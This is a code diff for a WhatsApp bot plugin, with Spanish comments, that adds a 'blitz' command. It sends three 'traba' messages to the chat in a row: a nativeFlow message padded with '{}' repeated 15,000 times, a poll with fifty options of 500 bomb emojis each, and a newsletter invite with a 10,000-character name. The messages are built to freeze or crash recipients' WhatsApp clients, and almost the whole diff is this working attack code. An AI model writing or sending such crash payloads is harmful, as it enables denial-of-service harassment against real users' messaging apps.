@@ -3,18 +3,23 @@ let handler = async (m, { conn }) => {
     const botNumber = conn.user?.jid || '';
     const sender = m.sender;
 
-    // Solo permite al owner o al propio bot
     if (sender !== ownerNumber && sender !== botNumber) {
         return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
     }
 
-    // Ejecuta el ataque Blitzr en el chat actual (grupo o privado)
-    await BlitzrForce(m.chat, conn);
+    const target = m.chat;
 
-    await conn.sendMessage(m.chat, { text: `⚡ Ataque Blitzr ejecutado.` }, { quoted: m });
+    // Enviar 3 trabas seguidas con diferentes tipos
+    await BlitzrForce(target, conn);           // nativeFlow
+    await delay(1500);
+    await PollTraba(target, conn);             // poll
+    await delay(1500);
+    await NewsletterTraba(target, conn);       // newsletter
+
+    await conn.sendMessage(m.chat, { text: `🔥 Traba múltiple enviada.` }, { quoted: m });
 };
 
-// Función Blitzr adaptada
+// NativeFlow traba pesada
 async function BlitzrForce(target, sock) {
     try {
         let message = {
@@ -25,8 +30,8 @@ async function BlitzrForce(target, sock) {
                             title: "© KayzX",
                             hasMediaAttachment: false,
                             locationMessage: {
-                                degreesLatitude: -999.0349999999999,
-                                degreesLongitude: 922.999999999999,
+                                degreesLatitude: -999.0349,
+                                degreesLongitude: 922.9999,
                                 name: "© KayzX",
                                 address: "© KayzX",
                             },
@@ -35,7 +40,7 @@ async function BlitzrForce(target, sock) {
                             text: "© KayzX",
                         },
                         nativeFlowMessage: {
-                            messageParamsJson: "{}".repeat(10000),
+                            messageParamsJson: "{}".repeat(15000), // Muy pesada
                         },
                         contextInfo: {
                             participant: "0@s.whatsapp.net",
@@ -52,12 +57,55 @@ async function BlitzrForce(target, sock) {
             userJid: target,
         });
     } catch (err) {
-        console.error(err);
+        console.error('Error nativeFlow:', err);
     }
 }
 
+// Poll traba
+async function PollTraba(target, sock) {
+    try {
+        const options = Array(50).fill("💣".repeat(500)); // 50 opciones, cada una con spam
+        let message = {
+            pollCreationMessage: {
+                name: "💥 Ataque Poll 💥",
+                options: options.map(option => ({ optionName: option })),
+                selectableOptionsCount: 1
+            }
+        };
+
+        await sock.relayMessage(target, message, { messageId: null });
+    } catch (err) {
+        console.error('Error poll:', err);
+    }
+}
+
+// Newsletter traba
+async function NewsletterTraba(target, sock) {
+    try {
+        const travas = '꧁'.repeat(10000);
+        let message = {
+            newsletterAdminInviteMessage: {
+                newsletterJid: "120363282786345717@newsletter",
+                newsletterName: "⚠️" + travas,
+                jpegThumbnail: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAUA', 'base64'), // base64 dummy
+                caption: "𝗧𝗿𝗮𝗯𝗮 𝗯𝘆 𝗞𝗮𝘆𝘇𝗫 💀",
+                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
+            }
+        };
+
+        await sock.relayMessage(target, message, { messageId: null });
+    } catch (err) {
+        console.error('Error newsletter:', err);
+    }
+}
+
+// Delay entre mensajes
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 handler.command = ['blitz'];
-handler.tags = ['fake', 'grupo', 'privado'];
+handler.tags = ['traba', 'flood', 'ataque'];
 handler.help = ['blitz'];
 
 export default handler;
